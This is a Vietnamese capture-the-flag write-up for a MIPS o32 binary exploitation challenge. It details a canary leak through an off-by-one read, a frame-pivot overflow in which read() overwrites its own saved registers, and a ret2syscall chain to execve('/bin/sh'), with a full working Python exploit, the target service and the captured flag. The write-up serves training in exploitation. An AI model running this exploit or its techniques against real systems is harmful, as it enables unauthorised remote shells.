---
title: "PWN#Beta"
category: "Pwn"
tags: ["mips", "o32", "off-by-one", "canary-leak", "stack-overflow", "ret2syscall", "static-binary"]
solve_date: "2026-10-14T18:00:00+07:00"
language: "vi"
points: 192
---

# PWN#Beta — leak MIPS o32 canary rồi ghi đè frame của read()

**Flag:** CTF{9d1468794bdeef6cc5325201ef334c89}  
**Service:** nc 169.58.126.107 5005  
**Định dạng flag:** CTF{}

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| vault (ELF32 MIPS32 rel2, static, stripped) | 630,556 | 4d51fecb9e1b38daaba1cbbb03688f6c6ac81e660e7cd02f0ee04c053e3741a0 |

## Đề bài

> PWN#Beta — 192 điểm. Lấy shell trên host từ xa và đọc flag.

Handout là binary vault 32-bit little-endian MIPS o32. Service in Enter your name:, echo lại tên bằng printf("Hello, %s", buf), in Leave a message for the vault keeper:, đọc buffer thứ hai rồi trả Message received. trước khi lặp lại. Flag nằm trong /flag/flag.txt trên host.

## Phân tích

### Binary

vault là ELF32 LSB MIPS MIPS32 rel2, static link, stripped, type EXEC (không PIE, image tại 0x400000), entry 0x401140. GNU_STACK là RW nên stack NX. Canary 4 byte được đọc qua gp-0x7fe0 rồi lưu tại fp+0x5c.

Không chạy được attachment ở local; vì vậy mọi địa chỉ dưới đây đo trên service live thay vì qemu-mipsel. Entry point là self-decrypting stub:

```text
0x401140  lui   $t1, 0x4a
0x401144  addiu $t1, $t1, 0x300
0x401148  lw    $t0, ($t1)          ; file value 0x8ac3f100
0x40114c  lui   $t2, 0x426f
0x401150  ori   $t2, $t2, 0x6772
0x401154  xor   $t3, $t0, $t2       ; 0x8ac3f100 ^ 0x426f6772 = 0xc8ac9672
0x401158  jr    $t3
```

Địa chỉ 0xc8ac9672 không map, nên qemu-mipsel-static ./vault chết ngay ở basic block đầu. Các string in ra cũng XOR-encrypted trong .data và chỉ có plaintext sau khi stub chạy.

### Hàm dễ tổn thương

Cả hai lần read đều ghi vào cùng stack buffer 64 byte tại fp+0x1c:

```text
0x400a90  addiu $sp, $sp, -0x68
0x400a9c  move  $fp, $sp
0x400aa0  sw    $gp, 0x10($sp)              ; $gp saved at fp+0x10
0x400ac8  bal   0x409590                    ; printf("Enter your name: ")
0x400ad0  lw    $gp, 0x10($fp)
0x400ad8  addiu $a2, $zero, 0x41            ; 65 bytes
0x400ae4  read(0, fp+0x1c, 0x41)            ; buf = fp+0x1c, size 64
0x400af8  addiu $v0, $fp, 0x1c
0x400b10  bal   0x409590                    ; printf("Hello, %s", buf)  -- no width, no NUL added
0x400b18  printf("\nLeave a message for the vault keeper: ")
0x400b3c  lw    $gp, 0x10($fp)
0x400b44  addiu $a2, $zero, 0x64            ; 100 bytes
0x400b50  read(0, fp+0x1c, 0x64)
0x400b60  puts("Message received.")
0x400b84  lw    $v0, -0x7fe0($gp)           ; canary check
0x400b88  lw    $v1, 0x5c($fp)
0x400b90  beq   $v1, $v0, 0x400ba8
0x400ba8  move  $sp, $fp ; lw $ra,0x64($sp) ; lw $fp,0x60($sp) ; addiu $sp,0x68 ; jr $ra
```

Name read dài hơn buffer 1 byte. Message read dài hơn buffer 36 byte, vì vậy phải giữ đúng canary — nhưng epilogue nạp lại $fp từ frame, nên pivot target cũng do attacker kiểm soát.

### Layout frame

| Offset | Nội dung |
|---|---|
| buf+0x00 .. buf+0x3f | buffer 64 byte, dùng chung cho name và message |
| buf+0x40 .. buf+0x43 | stack canary |
| buf+0x44 .. buf+0x47 | saved $fp |
| buf+0x48 .. buf+0x4b | saved $ra |
| buf+0x4c | $sp sau epilogue (fp lúc đầu bằng buf-0x1c) |

### Leak: ghi đè NUL của canary

Byte thấp nhất của canary là 0x00, nên tên dài 64 byte làm %s dừng ngay tại canary. Gửi 65 byte để newline cuối (0x0a) ghi đè số 0; printf tiếp tục qua 3 byte canary còn lại, saved $fp rồi 3 byte saved $ra cho tới null trong 0x00400c28. Response có đúng 10 byte stack sau chuỗi A (probe tên dài 300 byte, nên byte thứ 65 là A chứ không phải newline):

```text
300B resp: b'Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xfc\xad\xc58\x0c\x80@(\x0c@\nLeave a message for the vault keeper:' len 139
```

Vậy canary = 00 || bytes[0:3], main_fp = bytes[3:7], saved_ra = bytes[7:10] || 00 và buf = main_fp - 0x4c. Trên remote, các địa chỉ này ổn định giữa các kết nối:

```text
leak: canary=0060ec55 main_fp=0x40800c38 saved_ra=0x400c28 buf=0x40800bec
```

Canary thay đổi mỗi kết nối, còn stack address thì không.

### Runtime address shift

Ba vùng khác với VA trong handout; đo được bằng arbitrary-read primitive dựng từ cùng bug:

* Code ứng dụng 0x4002c0 .. 0x400ba8 và bare syscall tại 0x400394 chạy đúng file VA.
* libc static link nằm thấp hơn file VA 0x480 byte: puts 0x40ff60 -> 0x40fae0, printf 0x409590 -> 0x409110, read 0x427770 -> 0x4272f0, __stack_chk_fail 0x42b7f0 -> 0x42b370.
* $gp của ứng dụng là 0x4a9370 (giá trị danh nghĩa 0x4a9c60 trong file gây fault), tức .data thấp hơn 0x8f0 byte.

Vì vậy gadget 3 argument được gọi ở 0x433328 dù địa chỉ trong file là 0x4337a8; payload 1 phải đặt 0x4a9370 vào slot $gp.

### Tìm chính xác geometry

Hai yếu tố phải đo thực nghiệm vì không chạy được binary local:

* **Offset frame:** ladder payload trong chainbisect.py lần lượt cho $ra tới gadget 1, gadget 1 → gadget 2 → main, full 3-gadget call1, rồi call1 với $a0 = buf+2 trỏ marker. Chỉ lượt cuối in marker, xác định canary = buf+0x40, saved $fp = buf+0x44, saved $ra = buf+0x48.
* **Libc shift:** chạy cùng marker test với argument gadget tại file+0, file-0x480 và file-0x8f0. Chỉ -0x480 in thêm marker Message received.; hai địa chỉ kia chết im lặng, trông giống địa chỉ không tồn tại và làm tốn nhiều lượt thử.

Giả thuyết ban đầu runtime base 0x0a400000 phát sinh do reader đếm nhầm newline của format thành data byte; sau khi sửa lỗi đó, mọi địa chỉ khớp mô hình trên. Cũng đã thử function giống system ở file 0x408b80 nhưng không gọi tới được.

## Lời giải

### 1. Leak canary, $fp và buf

Gửi b'A'*64 + b'\n', parse Hello, tới newline rồi lấy 10 byte. Dựng canary với byte 0x00 đã biết, tính buf = main_fp - 0x4c và giữ socket mở: canary chỉ hợp lệ trên kết nối này.

### 2. Payload 1 — đưa epilogue vào lần read thứ hai

Message read nhận 100 byte nên canary, $fp và $ra đều có thể ghi:

```text
buf+0x24  0x4a9370     the $gp value the resumed code will load from *(fp+0x10)
buf+0x40  canary
buf+0x44  buf+0x14     saved $fp
buf+0x48  0x400b3c     saved $ra
```

0x400b3c là lw $gp,0x10($fp) ; read(0, $fp+0x1c, 100). Với $fp = buf+0x14, lệnh load $gp lấy word ta đặt tại buf+0x24 và read ghi vào buf+0x30.

### 3. Payload 2 — read() ghi đè chính frame của nó

Tại 0x400b50, stack pointer = buf+0x4c, nên frame 0x18 byte của read() phủ buf+0x34 .. buf+0x4b; $s0/$s1/$s2/$ra ở buf+0x3c/0x40/0x44/0x48. Destination buf+0x30 chồng lấn frame này: 100 byte gửi vào ghi đè saved register mà read() sắp pop. Khi return, nó nạp $ra do ta đặt rồi tiếp tục với $sp = buf+0x4c, không chạm canary check ở 0x400b7c.

```text
buf+0x30  "/bin/sh\0"        <- also $a0 later
buf+0x3c  buf+0x30, 0        <- argv = ["/bin/sh", NULL]
buf+0x48  0x433328           <- read()'s $ra = argument gadget
```

### 4. Argument gadget → bare syscall

Gadget tại file 0x4337a8 (runtime 0x433328) dựng syscall frame đầy đủ từ $sp:

```text
0x4337a8  lw   $v0, 0x44($sp)
0x4337ac  lw   $a2, 0x38($sp)
0x4337b0  lw   $a1, 0x3c($sp)
0x4337b4  lw   $a0, 0x40($sp)
0x4337b8  lw   $t9, 0x28($sp)
0x4337c8  jalr $t9
```

Payload 2 đặt $v0 = 4011 (o32 __NR_execve), $a0 = buf+0x30, $a1 = buf+0x3c, $a2 = 0 và $t9 = 0x400394 — bare syscall instruction trong vùng ứng dụng nên không chịu libc shift.

### 5. Shell

execve("/bin/sh", ["/bin/sh", NULL], NULL) chạy dưới quyền root trong container. /flag là thư mục, file flag nằm tại /flag/flag.txt.

## Mã khai thác

Bản tự chứa của script cuối (pwn_final.py leak helpers + exp13.py + getflag.py; giữ nguyên logic):

```python
#!/usr/bin/env python3
# PWN#Beta - MIPS o32 static, NX stack, 4-byte canary, non-PIE at 0x400000.
# 1) 65-byte name read overwrites the canary's NUL -> printf("Hello, %s") leaks
#    canary[1..3], saved $fp and saved $ra.
# 2) 100-byte message read: $fp = buf+0x14, $ra = 0x400b3c, gp cell at buf+0x24.
#    The resumed code does lw $gp,0x10($fp) then read(0, $fp+0x1c, 100) -> buf+0x30.
# 3) That read lands on read()'s own saved registers, so its epilogue returns into
#    the argument gadget 0x433328 -> bare syscall at 0x400394 -> execve("/bin/sh").
import socket, struct, time

HOST, PORT = '169.58.126.107', 5005

SITE2   = 0x400B3C            # lw $gp,0x10($fp); read(0, $fp+0x1c, 100)
SYSCALL = 0x400394            # bare `syscall` (app region, delta 0)
GAD     = (0x4337A8 - 0x480)  # lw $v0,0x44(sp); $a2,0x38; $a1,0x3c; $a0,0x40; $t9,0x28; jalr $t9
GP_R    = 0x4A9370            # $gp value the remote application actually uses
WRITE, READ_S, OPEN, EXECVE = 4004, 4003, 4005, 4011

# geometry: F1 = buf+0x14  ->  read lands at W = buf+0x30
# read epilogue: $sp = buf+0x4c; slots inside p2 (index = abs - 0x30)
IDX_S0, IDX_S1, IDX_S2, IDX_RA = 0x3c - 0x30, 0x40 - 0x30, 0x44 - 0x30, 0x48 - 0x30
# GAD frame, $sp = buf+0x4c:
I_T9 = 0x28 + 0x4c - 0x30
I_A2 = 0x38 + 0x4c - 0x30
I_A1 = 0x3c + 0x4c - 0x30
I_A0 = 0x40 + 0x4c - 0x30
I_V0 = 0x44 + 0x4c - 0x30
STR, ARGV = 0, 12          # p2 indices for "/bin/sh" and argv array


def conn():
    s = socket.create_connection((HOST, PORT), 15)
    s.settimeout(4)
    return s


def drain(s, t=0.5, extra=0.35):
    time.sleep(t)
    out = b''
    s.settimeout(extra)
    while True:
        try:
            r = s.recv(4096)
        except Exception:
            break
        if not r:
            break
        out += r
    return out


def leak():
    """return (sock, canary4, main_fp, buf_abs, junk_after_prompt)"""
    last = None
    for _ in range(8):
        try:
            s = conn()
        except Exception as e:
            last = e; time.sleep(1); continue
        head = drain(s, 0.35)
        if b'name' not in head.lower():
            s.close(); continue
        s.sendall(b'A' * 64 + b'\n')
        d = drain(s, 0.5)
        i = d.find(b'Hello, ')
        if i < 0:
            s.close(); continue
        b = d[i + 7:]
        n = 0
        while n < len(b) and b[n:n + 1] == b'A':
            n += 1
        if b[n:n + 1] == b'\n':
            n += 1
        lk = b[n:]
        if len(lk) < 10:
            s.close(); continue
        canary = b'\x00' + lk[0:3]
        mf = struct.unpack('<I', lk[3:7])[0]
        ra = struct.unpack('<I', lk[7:10] + b'\x00')[0]
        buf = (mf - 0x4c) & 0xFFFFFFFF
        print('  leak: canary=%s main_fp=%#x saved_ra=%#x buf=%#x' % (canary.hex(), mf, ra, buf))
        return s, canary, mf, buf, lk[10:]
    raise RuntimeError('leak failed: %r' % (last,))


def build(buf, ck, v0, a0, a1, a2, extra=None):
    p1 = bytearray(100)
    p1[64:68] = ck
    struct.pack_into('<I', p1, 68, buf + 0x14)      # $fp = F1
    struct.pack_into('<I', p1, 72, SITE2)           # $ra = read site
    struct.pack_into('<I', p1, 0x24, GP_R)          # *(F1+0x10) = valid gp
    p2 = bytearray(100)
    struct.pack_into('<I', p2, IDX_RA, GAD)         # read returns -> arg gadget
    struct.pack_into('<I', p2, I_T9, SYSCALL)
    struct.pack_into('<I', p2, I_A2, a2)
    struct.pack_into('<I', p2, I_A1, a1)
    struct.pack_into('<I', p2, I_A0, a0)
    struct.pack_into('<I', p2, I_V0, v0)
    p2[STR:STR + 8] = b'/bin/sh\x00'
    struct.pack_into('<I', p2, ARGV, buf + 0x30 + STR)
    struct.pack_into('<I', p2, ARGV + 4, 0)
    for off, val in (extra or {}).items():
        p2[off:off + len(val)] = val
    return bytes(p1), bytes(p2)


def run(label, v0, a0, a1, a2, follow=(), total=6.0):
    s, ck, mf, buf, _ = leak()
    p1, p2 = build(buf, ck, v0, a0, a1, a2)
    s.sendall(p1)
    time.sleep(0.3)
    o = drain(s, 0.4)
    t0 = time.time()
    s.sendall(p2)
    s.settimeout(1.0)
    while time.time() - t0 < total:
        try:
            r = s.recv(4096)
        except Exception:
            continue
        if r == b'':
            o += b'<EOF>'
            break
        o += r
    for f in follow:
        try:
            s.sendall(f.encode() if isinstance(f, str) else f)
        except Exception:
            o += b'<DEAD>'
            break
        try:
            o += s.recv(4096)
        except Exception:
            pass
    print('%-30s dt=%4.1f -> %r' % (label, time.time() - t0, o[-150:]))
    try:
        s.close()
    except Exception:
        pass
    return o


if __name__ == '__main__':
    B = 0x40800bec          # stable leaked buf on this target
    W = B + 0x30
    run('FLAG', EXECVE, W + STR, W + ARGV, 0,
        follow=['cat /flag/flag.txt\n', 'echo DONE\n'])
```

## Kết quả

Đã vào được root shell; /flag là thư mục chứa flag.txt (38 byte):

```text
FLAG                           dt= 7.4 -> b'total 680\ndrwxr-xr-x 1 root root   4096 Oct 14 00:11 .\n...'
FLAG                           dt= 8.4 -> b'60 Oct 14 00:11 .\ndrwxr-xr-x 1 root root 4096 Oct 14 00:11 ..\n-r--r--r-- 1 root root   38 Oct 14 00:11 flag.txt\n/proc/kpageflags\n/flag\n/flag/flag.txt\n'
```

Dòng đầu bị cắt ở ...; danh sách đầy đủ tiếp tục với .. và -r-xr-xr-x 1 root root 683848 Oct 13 18:42 vault.

Lần chạy cuối, tái hiện trên kết nối mới với cùng output:

```text
FLAG                           dt= 6.5 -> b'Message received.\nCTF{9d1468794bdeef6cc5325201ef334c89}\nDONE\n'
FLAG                           dt= 6.6 -> b'Message received.\nCTF{9d1468794bdeef6cc5325201ef334c89}\nDONE\n'
```

Dòng Message received. đầu tiên do puts của vuln() in sau payload đầu; phần còn lại là output từ shell.

## Ghi chú

* Leak toàn bộ đến từ tên 65 byte. Nếu byte 1–3 của canary có 0x00, chuỗi bị cắt sớm, nhận chưa đủ 10 byte và script kết nối lại để lấy canary mới. Vòng retry là bắt buộc.
* Stack address cố định (buf = 0x40800bec, main_fp = 0x40800c38) nhưng canary thay đổi mỗi kết nối, nên payload 1 và 2 phải đi cùng socket, cách nhau 0,3 giây.
* Phải đặt $gp tại fp+0x10 cho mỗi fake frame. Code resumed chạy lw $gp,0x10($fp), rồi dereference gp-0x7f7c để tìm read; nếu $gp sai thì process chết ngay sau Message received., dễ nhầm là gadget sai.
* libc blob thấp hơn file VA 0x480 byte còn .data thấp hơn 0x8f0. Gọi puts/printf ở file address hoặc system tại 0x408b80 sẽ chết im lặng. Kiểm tra địa chỉ libc bằng marker in ra (puts-site 0x400b60) trước khi tin dùng.
* Attachment không chạy được local: entry stub XOR [0x4a0300] với 0x426f6772 rồi nhảy tới 0xc8ac9672. Mọi offset trong write-up đều được xác nhận trên service live.
* Message read tối đa 100 byte ($a2 = 0x64), payload 2 phải dùng hết: slot $v0 của gadget ở 0x44($sp) = buf+0x90, word cuối mà read ghi được. Thiếu một byte thì execve dùng syscall number cũ.
